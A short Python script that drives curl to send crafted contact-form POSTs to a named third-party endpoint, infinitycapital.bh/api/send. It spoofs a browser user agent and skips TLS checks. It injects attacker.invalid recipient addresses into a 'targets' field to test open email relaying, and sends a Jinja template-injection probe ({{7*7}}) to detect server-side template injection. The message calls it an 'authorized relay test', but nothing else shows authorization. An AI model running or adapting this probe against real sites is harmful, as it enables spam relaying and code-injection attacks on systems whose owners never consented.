import subprocess, time

UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
EP = 'https://www.infinitycapital.bh/api/send'
SLEEP = 7


def post(fields, tag, pace=True):
    cmd = ['curl', '-s', '-k', '-m', '45', '-A', UA, '-X', 'POST', '-w', '\n__C%{http_code}__T%{time_total}']
    for k, v in fields:
        cmd += ['-F', '%s=%s' % (k, v)]
    cmd += [EP]
    r = subprocess.run(cmd, capture_output=True, text=True)
    o = r.stdout
    i = o.rfind('__C')
    meta = o[i:].strip() if i >= 0 else 'NA'
    body = (o[:i] if i >= 0 else o).strip()
    sent = '"data":{"id"' in body.replace(' ', '')
    print('== %-24s %-30s %s%s' % (tag, meta, '[SENT] ' if sent else '', body[:150]))
    if pace:
        time.sleep(SLEEP)
    return body


def mk(**kw):
    f = [('fname', 'Probe'), ('lname', 'User'), ('areacode', '973'), ('tel', '3000000'),
         ('cname', 'probe@attacker.invalid'), ('subject', 'General Inquiry'),
         ('msg', 'd14 authorized relay test'), ('check', ''),
         ('targets', 'relay@attacker.invalid')]
    for k, v in kw.items():
        f = [(a, v if a == k else b) for a, b in f]
    return f


post(mk(), 'paced_baseline', pace=False)
post(mk(lname='{{7*7}}'), 'paced_jinja')
post(mk(lname='ABCDEFGH'), 'paced_plain_control')
